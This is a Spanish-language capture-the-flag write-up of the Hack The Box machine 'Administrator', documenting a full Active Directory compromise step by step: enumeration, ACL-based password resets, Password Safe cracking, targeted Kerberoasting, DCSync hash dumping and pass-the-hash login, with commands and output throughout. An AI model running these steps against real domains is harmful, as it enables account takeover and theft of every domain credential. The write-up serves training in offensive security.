---
layout: single
title: Administrator - Hack The Box
excerpt: Este es el write-up de Administrator, una máquina Windows de dificultad media centrada en el abuso de Active Directory, donde los permisos ACL inadecuados, la reutilización de credenciales y el Kerberoasting conducen al compromiso total del dominio.
date: 2024-11-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-administrator/administrator-logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - AD
  - kerberoasting
  - ACL
---

Este artículo detalla los pasos seguidos para resolver la máquina **Administrator** de Hack The Box. Es un desafío puro de Active Directory. Se empieza con las credenciales de un usuario y se utilizan para recopilar datos de Bloodhound en el dominio. Se descubre que se puede modificar la contraseña de un usuario y que ese usuario puede modificar la contraseña de otro usuario. Ese usuario tiene acceso a un recurso compartido FTP donde se encuentra un archivo Password Safe. Se descifra la contraseña para recuperar más contraseñas y se pasa al siguiente usuario. Este usuario tiene GenericWrite sobre otro usuario, lo que se aprovecha con un ataque Kerberoasting dirigido. Por último, se realiza un ataque DCSync para volcar el hash del administrador del dominio y comprometer completamente el dominio.

### Tools/Blogs used

<ul>
  <li><strong>NetExec</strong>: <a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener noreferrer">https://github.com/Pennyw0rth/NetExec</a></li>
  <li><strong>Evil-WinRM</strong>: <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener noreferrer">https://github.com/Hackplayers/evil-winrm</a></li>
  <li><strong>BloodHound</strong>: <a href="https://github.com/SpecterOps/BloodHound" target="_blank" rel="noopener noreferrer">https://github.com/SpecterOps/BloodHound</a></li>
  <li><strong>bloodhound-python</strong>: <a href="https://github.com/fox-it/BloodHound.py" target="_blank" rel="noopener noreferrer">https://github.com/fox-it/BloodHound.py</a></li>
  <li><strong>Impacket</strong>: <a href="https://github.com/fortra/impacket" target="_blank" rel="noopener noreferrer">https://github.com/fortra/impacket</a></li>
  <li><strong>Hashcat</strong>: <a href="https://github.com/hashcat/hashcat" target="_blank" rel="noopener noreferrer">https://github.com/hashcat/hashcat</a></li>
  <li><strong>John the Ripper</strong>: <a href="https://github.com/openwall/john" target="_blank" rel="noopener noreferrer">https://github.com/openwall/john</a></li>
  <li><strong>pwsafe2john</strong>: <a href="https://github.com/openwall/john/tree/bleeding-jumbo/run" target="_blank" rel="noopener noreferrer">https://github.com/openwall/john/tree/bleeding-jumbo/run</a></li>
  <li><strong>Password Safe</strong>: <a href="https://github.com/pwsafe/pwsafe" target="_blank" rel="noopener noreferrer">https://github.com/pwsafe/pwsafe</a></li>
  <li><strong>targetedKerberoast</strong>: <a href="https://github.com/ShutdownRepo/targetedKerberoast" target="_blank" rel="noopener noreferrer">https://github.com/ShutdownRepo/targetedKerberoast</a></li>
</ul>

## Recon

El primer paso será utilizar nmap para ver los puertos abiertos de la máquina. `nmap` encuentra varios puertos TCP abiertos:

```
└─$ nmap -sVC 10.10.11.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 08:17 EST
Nmap scan report for 10.10.11.42
Host is up (0.17s latency).
Not shown: 988 closed tcp ports (reset)
PORT STATE SERVICE VERSION
21/tcp open ftp Microsoft ftpd
| ftp-syst:
|\_ SYST: Windows_NT
53/tcp open domain Simple DNS Plus
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-13 20:17:12Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
| date: 2024-11-13T20:17:23
|_ start_date: N/A
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled and required
|\_clock-skew: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.47 seconds
```

Con los resultados del nmap podemos observar que la máquina parece ser un controlador de dominio de Windows (Kerberos, LDAP, SMB, etc.), y también tiene WinrM (5985) abierto, por lo que probablemnte podamos usar ese puerto para acceder con credenciales a la máquina.

Además el FTP está abierto, lo que no es común en un DC.

También se observa en la salida del script LDAP el nombre del dominio administrator.htb. Este nombre de host del DC se añade en el archivo /etc/hosts. Se tiene que añadir la siguiente linea:

```
└─$ nano /etc/hosts

10.10.11.42   administrator.htb
```

## Enumeración

Viendo que tenemos credenciales válidas para el dominio, se utilizan estas credenciales para obtener una lista de usuarios válidos:

```
└─$ netexec smb administrator.htb -u olivia -p ichliebedich --users
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich
SMB         10.10.11.42     445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.11.42     445    DC               Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain
SMB         10.10.11.42     445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.11.42     445    DC               krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account
SMB         10.10.11.42     445    DC               olivia                        2024-10-06 01:22:48 0
SMB         10.10.11.42     445    DC               michael                       2024-10-06 01:33:37 0
SMB         10.10.11.42     445    DC               benjamin                      2024-10-06 01:34:56 0
SMB         10.10.11.42     445    DC               emily                         2024-10-30 23:40:02 0
SMB         10.10.11.42     445    DC               ethan                         2024-10-12 20:52:14 0
SMB         10.10.11.42     445    DC               alexander                     2024-10-31 00:18:04 0
SMB         10.10.11.42     445    DC               emma                          2024-10-31 00:18:35 0
SMB         10.10.11.42     445    DC               [*] Enumerated 10 local users: ADMINISTRATOR
```

Se puede utilizar este comando para guardar los usuarios en un archivo

```
nxc smb 10.10.11.42 -u olivia -p "ichliebedich" --users | grep -E '^[[:space:]]*SMB[[:space:]]+[0-9.]+' | awk '{print $5}'
```

El siguiente paso de la enumeración, es ver si con el usuario inicial tenemos lectura / escritura en alguna carpeta compartida interesante de la máquina, pero no es el caso.

```
└─$ netexec smb administrator.htb -u olivia -p ichliebedich --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share
```

Recordando que la máquina tiene el puerto WinRM abierto, si el usuario esta dentro del grupo de Remote Desktop Managment Users, podremos acceder a la máquina a través de este puerto. Por lo que a continuación se comprueba si con las credenciales iniciales podemos acceder a través de este puerto.

```
└─$ netexec winrm 10.10.11.42 -u olivia -p ichliebedich
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\olivia:ichliebedich (Pwn3d!)
```

Es posible acceder a la máquina a través del puerto de WinRM por lo que se utiliza evil-winrm para acceder.

```
└─$ evil-winrm -i administrator.htb -u olivia -p ichliebedich

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents>
```

Podemos ver los privilegios de olivia y los grupos a los que pertence.

```
*Evil-WinRM* PS C:\inetpub> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
administrator\olivia S-1-5-21-1088858960-373806567-254189436-1108

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Olivia no tiene ningún privilegio explotable, pero se confirma que esta en el grupo de Remote Management Users.

### Bloodhound

Se ha usado el recolector **bloodhound-python** para obtener los datos del dominio y subirlos a **Bloodhound**.

```
└─$ bloodhound-python -d administrator.htb -c all -u olivia -p ichliebedich -ns 10.10.11.42 --zip
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 27S
INFO: Compressing output into 20241116053818_bloodhound.zip

```

Una vez obtenido el zip, se ha subido a Bloodhound. Aquí se puede observar que olivia tiene permiso GenericAll al usuario Michael, esto significa que olivia tiene control para por ejemplo cambiarle la contraseña al usuario Michael, lo que permitirá ganar acceso como ese usuario.

![](/assets/images/htb-writeup-administrator/olivia-acl.png)

## Explotación (Olivia -> Michael)

Para cambiar la contraseña se ha utilizado net rpc

```
net rpc password "michael" "michael123" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42
```

Una vez cambiada podemos comprobar que las nuevas credenciales son válidas con netexec, tanto por SMB como WinRM

```
└─$ netexec smb 10.10.11.42 -u michael -p 'michael123'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\michael:michael123
```

```
└─$ netexec winrm 10.10.11.42 -u michael -p 'michael123'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\michael:michael123 (Pwn3d!)
```

## Movimiento Lateral (Michael -> Benjamin)

Volviendo a Bloodhound y comprobando los permisos de michael, se observa que este usuario tiene permiso de ForceChangePassword sobre benjamin, lo que le permite cambiarle la contraseña. Por lo que se volverá a realizar la misma técnica que en el paso anterior.

```
net rpc password "benjamin" "benjamin123" -U "administrator.htb"/"michael"%"michael123" -S 10.10.11.42
```

Una vez cambiada podemos comprobar que las nuevas credenciales son válidas con netexec, solo por SMB.

```
└─$ netexec smb 10.10.11.42 -u benjamin -p 'benjamin123'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\benjamin:benjamin123
```

```
└─$ netexec winrm 10.10.11.42 -u benjamin -p 'benjamin123'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [-] administrator.htb\benjamin:benjamin123
```

Enumerando con este usuario no parece tener permisos explotables ni en la máquina ni en el Directorio Activo. Recordando que teníamos el puerto 21 abierto en la máquina, usando netexec se ha comprobado si estas credenciales nos sirven para acceder.

```
└─$ netexec ftp administrator.htb -u benjamin -p benjamin123
FTP         10.10.11.42     21     administrator.htb [+] benjamin:benjamin123
```

Son validas! Eso es porque Benjamin está en el grupo Share Moderates, como puedo ver desde mi shell como Olivia.

```
*Evil-WinRM* PS C:\Users\olivia\Documents> net user benjamin
User name                    benjamin
Full Name                    Benjamin Brown
...[snip]...

Local Group Memberships      *Share Moderators
Global Group memberships     *Domain Users
The command completed successfully.
```

## Movimiento Lateral (Benjamin -> user.txt)

Cuando entramos con el usuario benjamin al ftp podemos obtener el archivo Backup.psafe3.

```
└─$ ftp 10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:oxdf): benjamin
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||60887|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||60902|)
125 Data connection already open; Transfer starting.
100% |*************************************************************************|   952        6.67 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (6.66 KiB/s)
```

Podemos saber que el fichero es un Password Save V3 database usando el comando file

```
└─$ file Backup.psafe3
Backup.psafe3: Password Safe V3 database
```

Se observa que el fichero esta protegido por una contraseña por lo que se ha utilizado pwsafe2john y posteriormente john the ripper para romper esta contraseña.

```
└─$ pwsafe2john Backup.psafe3 > pwsafedump.txt
```

```
└─$ john pwsafedump.txt --wordlist=/usr/share/wordlist/rockyou.txt
...[snip]...
tekieromucho  (Backu)
...[snip]...
```

La contraseña es tekieromucho. Una vez obtenida la contraseña se ha descargado y instalado la última version de Password Safe desde [GitHub](https://github.com/pwsafe/pwsafe/releases?q=non-windows&expanded=true). Al ejecutarse y introducir la contraseña, se pueden observar tres usuarios:

![](/assets/images/htb-writeup-administrator/users.png)

Si probamos las tres contraseñas, detectamos que la única válida es la de emily, que también nos sirve para WinRM.

```
└─$ netexec smb administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb

└─$ netexec winrm administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)
```

Con este usuario podemos obtener la primera flag.

```
*Evil-WinRM* PS C:\Users\emily\desktop> cat user.txt
142aa43f************************
```

## Escalada de Privilegios

Volviendo a Bloodhound, si revisamos los permisos de emily, se puede observar que tiene privilegio de GenericAll contra Ethan, que es un Administrador del Dominio y puede realizar DCSync contra el dominio.

![](/assets/images/htb-writeup-administrator/emily.png)

El permiso GenericAll otorga control total sobre el objeto afectado, lo que permite a emily modificar atributos críticos del usuario Ethan, incluyendo su contraseña, pertenencia a grupos o delegación de permisos.

Dado que Ethan es miembro del grupo Domain Admins, comprometer esta cuenta implica un control completo sobre el dominio. Además, este nivel de privilegio permite realizar un ataque DCSync, mediante el cual es posible replicar credenciales del controlador de dominio y obtener los hashes de todas las cuentas del dominio, incluyendo krbtgt.

En consecuencia, el privilegio GenericAll de emily sobre Ethan representa una ruta directa de escalada de privilegios hasta Domain Admin y compromiso total del dominio.

### Targeted Kerberoasting

Un nombre principal de servicio (SPN) es un identificador único que asocia una instancia de servicio con una cuenta de servicio en Kerberos. El kerberoasting es un ataque en el que un usuario autenticado solicita un ticket para un servicio mediante su SPN, y el ticket que se devuelve está cifrado con la contraseña del usuario asociado a ese servicio. Si esa contraseña es débil, se puede descifrar mediante fuerza bruta sin conexión.

Para realizar un kerberoast dirigido, se utiliza el privilegio GenericWrite para dar a Ethan un SPN. A continuación, se puede solicitar un ticket para ese servicio falso y obtener un ticket cifrado con el hash de la contraseña de Ethan. Si esa contraseña es débil, se puede descifrarla sin conexión.

Se ha utilizado la herramienta [targetedkerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast.git)

Ahora me aseguraré de que mi reloj esté sincronizado y ejecutaré el script, que detectará los privilegios de escritura de la usuaria emily, añadirá un SPN, obtendrá el hash y luego limpiará.

```
└─$ sudo ntpdate administrator.htb
2025-04-16 01:40:05.191473 (+0000) +26969.718771 +/- 0.046738 administrator.htb 10.10.11.42 s1 no-leap
CLOCK: time stepped by 26969.718771
```

```
└─$ .\targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
Installed 26 packages in 24ms
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$e7458cb1f13711cedb8f591a5d166b9f$5bdc26...[snip]...
[VERBOSE] SPN removed successfully for (ethan)
```

`hashcat` con `rockyou.txt` rompe el hash en unos pocos segundos.

```
└─$ hashcat ethan.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol
...[snip]...
$krb5tgs$23$_ethan$ADMINISTRATOR.HTB$administrator.htb/ethan_$82e55c4be49...[snip]...:limpbizkit
...[snip]...
```

La contraseña del usuario ethan es "limpbizkit". Este usuario tiene privilegio de DCSync contra el dominio, por lo que podemos obtener todos los hashes usando impacket-secretsdump.

```
└─$ impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'10.10.11.42'
Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:02cb8258df07966e32677128e5ff1d26:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:02cb8258df07966e32677128e5ff1d26:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:811213be007de8ae1e546aaed7c6ac42343d7211a60f938d69733bce9ae2c5c9
administrator.htb\michael:aes128-cts-hmac-sha1-96:31dbcbe5dbd7ccb1faf5272d83e0f8eb
administrator.htb\michael:des-cbc-md5:0dbf5134d0c2ec8a
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:f88ef08792b0955ae4ccebf7768098b1fe0ae67c84d72c0dcc48c5e7fcb38bae
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:e189232083e5dbfcf489d46181fe7e73
administrator.htb\benjamin:des-cbc-md5:d085a40489fdb6a4
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up...
```

Con el hash de Administrador podemos acceder a la máquina y obtener la flag final.

```
└─$ evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
4cf2d737************************
```
